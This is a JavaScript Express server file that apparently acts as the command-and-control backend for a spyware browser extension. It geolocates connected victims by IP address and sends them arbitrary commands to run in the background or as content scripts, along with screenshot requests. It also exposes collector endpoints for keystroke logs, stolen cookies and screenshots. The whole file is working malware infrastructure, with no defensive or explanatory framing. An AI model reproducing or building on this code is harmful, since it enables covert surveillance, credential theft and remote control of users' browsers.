import express from 'express';
import cors from 'cors';
import http from 'http';
import ws_server, {CLIENTS} from "./ws_server.js";
import 'dotenv/config';
import * as fs from 'node:fs'

const app = express();

// Middleware to disable cors
app.use(cors())

// Middleware to parse JSON bodies
app.use(express.json({ limit: '200mb' }));

app.get('/clients', async (req, res) => {
    let processedClients = CLIENTS.map((client) => ({
        uid: client.userId,
        ip: client._socket.remoteAddress,
        address: {}
    }))

    // TODO: add batching of 50 clients to get IPs
    const clientIps = processedClients.map((client)=> client.ip)
    if (clientIps.length === 0) {
        return res.json(processedClients)
    }

    try {
        const res = await fetch(`http://api.ipstack.com/${clientIps.join(',')}?access_key=${process.env.IPSTACK_API_KEY}`)
        const data = await res.json()

        if (Array.isArray(data)) {
            data.forEach((client) => {
                let localClient = processedClients.find((c) => c.ip === client.ip)
                localClient.address = {
                    city: client.city,
                    country: client.country_name,
                    postCode: client.zip
                }
            })
        } else {
            let localClient = processedClients.find((c) => c.ip === data.ip)
            localClient.address = {
                city: data.city,
                country: data.country_name,
                postCode: data.zip
            }
        }
    } catch (err) {
        console.error(err.message);
    }

    return res.json(processedClients)
})

app.post(`/clients/send-command`, (req, res) => {
    if (!req.body.type.includes('SCREENSHOT') && !req.body.command) {
        res.status(400).send('Bad request')
        return
    }

    const message = {
        data: req.body.command,
        type: [],
    }

    if (req.body.type.includes('SCREENSHOT')) {
        message.type.push('SCREENSHOT')
    }
    if (req.body.type.includes('BACKGROUND')) {
        message.type.push('BG_COMMAND')
    }
    if (req.body.type.includes('CONTENT-SCRIPT')) {
        message.type.push('CS_COMMAND')
    }

    const jsonMessage = JSON.stringify(message)

    const clients = CLIENTS.filter((client) => req.body.clients.includes(client.userId))

    clients.forEach(client => {
        console.log('Sending command to client: ', client.userId)
        client.send(jsonMessage)
    })
    res.status(200).send('Command sent')
})

app.get('/screenshots', (req, res) => {
    // TODO: list all screenshots from S3
    const screenshots = fs.readdirSync('tmp').filter((file) => file.endsWith('.jpeg'))
    res.json(screenshots)
})

// POST request handler
app.post('/collector/key-logger', (req, res) => {
    console.log(req.body); // Logs the request body to the console
    return res.status(200).send('Key logs received')
});

app.post('/collector/cookies', (req, res) => {
    console.log(req.body)
    return res.status(200).send('Cookies received')
})

app.post('/collector/screenshot', (req, res) => {
    // TODO: upload screenshots to S3 instead of local
    let buff = Buffer.from(req.body.dataUrl.replace('data:image/jpeg;base64,', ''), 'base64');
    fs.writeFileSync('tmp/screenshot.jpeg', buff);
    return res.status(200).send('Screenshot received')
})

export const http_server = http.createServer(app);
